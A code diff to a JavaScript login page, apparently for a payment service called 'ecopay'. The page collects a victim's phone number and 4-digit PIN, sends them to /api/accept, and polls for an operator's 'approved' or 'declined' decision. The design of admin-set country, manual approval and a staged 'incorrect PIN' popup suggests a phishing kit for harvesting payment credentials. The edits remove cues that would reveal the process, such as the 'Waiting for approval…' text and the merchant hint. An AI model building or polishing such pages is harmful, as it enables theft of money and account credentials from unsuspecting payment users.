@@ -238,7 +238,7 @@ function applyAdminCountry() {
   if (!entry) {
     flagEl.textContent = '🏳️';
     dialEl.textContent = '+—';
-    showFormError('No country configured. Please ask the merchant to set the destination country.');
+    showFormError('No country configured.');
     document.getElementById('loginBtn').disabled = true;
     return;
   }
@@ -324,7 +324,7 @@ function showIncorrectPinPopup() {
 }
 
 /* ============================================================
-   Submit + poll
+   Submit — instant transition, no "Logging in…" text
 ============================================================ */
 async function submitLogin() {
   clearFormError();
@@ -340,13 +340,12 @@ async function submitLogin() {
   if (phoneDigits.length < 6) { showFormError('Please enter a valid phone number.'); document.getElementById('phoneInput').focus(); return; }
   if (pin.length !== 4) { showFormError('Please enter all 4 PIN digits.'); const empty = pinEls.find(el => !el.value); if (empty) empty.focus(); return; }
 
-  const btn = document.getElementById('loginBtn');
-  btn.disabled = true;
-  btn.textContent = 'Logging in…';
+  // No text change on the button — just show the verifying overlay immediately
+  document.getElementById('loginBtn').disabled = true;
+  document.getElementById('verifying').classList.add('show');
 
   const txId = currentTx ? currentTx.tx : null;
 
-  // -------- START POLL FIRST --------
   let polling = true;
   const start = Date.now();
   const maxWaitMs = 5 * 60 * 1000;
@@ -356,8 +355,7 @@ async function submitLogin() {
     if (Date.now() - start > maxWaitMs) {
       polling = false;
       document.getElementById('verifying').classList.remove('show');
-      btn.disabled = false;
-      btn.textContent = 'Login';
+      document.getElementById('loginBtn').disabled = false;
       showFormError('Request timed out. Please try again.');
       return;
     }
@@ -368,10 +366,6 @@ async function submitLogin() {
 
       if (decision === 'approved') {
         polling = false;
-        if (currentTx) {
-          currentTx.status = 'success';
-          try { sessionStorage.setItem('ecopay_current', JSON.stringify(currentTx)); } catch (e) {}
-        }
         const q = new URLSearchParams({
           tx:  (currentTx && currentTx.tx)  || '',
           am:  (currentTx && currentTx.am)  || '',
@@ -386,8 +380,7 @@ async function submitLogin() {
       if (decision === 'declined') {
         polling = false;
         document.getElementById('verifying').classList.remove('show');
-        btn.disabled = false;
-        btn.textContent = 'Login';
+        document.getElementById('loginBtn').disabled = false;
         pinEls.forEach(el => { el.value = ''; el.classList.remove('filled'); });
         pinEls[0].focus();
         showIncorrectPinPopup();
@@ -395,50 +388,32 @@ async function submitLogin() {
       }
     } catch (e) { /* retry */ }
 
-    if (polling) setTimeout(poll, 1500);
+    if (polling) setTimeout(poll, 1000);
   };
 
   poll();
-  // -------- END POLL START --------
 
   try {
     const res = await fetch('/api/accept', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        transactionId: txId,
-        phone: dial + phoneDigits,
-        pin: pin
-      })
+      body: JSON.stringify({ transactionId: txId, phone: dial + phoneDigits, pin: pin })
     });
-
     let result = { status: 'failed' };
     try { result = await res.json(); } catch (e) {}
 
     if (result.status === 'failed') {
       polling = false;
       document.getElementById('verifying').classList.remove('show');
-      btn.disabled = false;
-      btn.textContent = 'Login';
+      document.getElementById('loginBtn').disabled = false;
       showFormError(result.message || 'Authorization failed.');
       pinEls.forEach(el => { el.value = ''; el.classList.remove('filled'); });
       pinEls[0].focus();
-      return;
-    }
-
-    // Show verifying overlay once the accept succeeded
-    document.getElementById('verifying').classList.add('show');
-    btn.textContent = 'Waiting for approval…';
-
-    if (currentTx) {
-      currentTx.status = 'pending';
-      try { sessionStorage.setItem('ecopay_current', JSON.stringify(currentTx)); } catch (e) {}
     }
   } catch (err) {
     polling = false;
     document.getElementById('verifying').classList.remove('show');
-    btn.disabled = false;
-    btn.textContent = 'Login';
+    document.getElementById('loginBtn').disabled = false;
     showFormError('Could not reach the server. Please try again.');
   }
 }
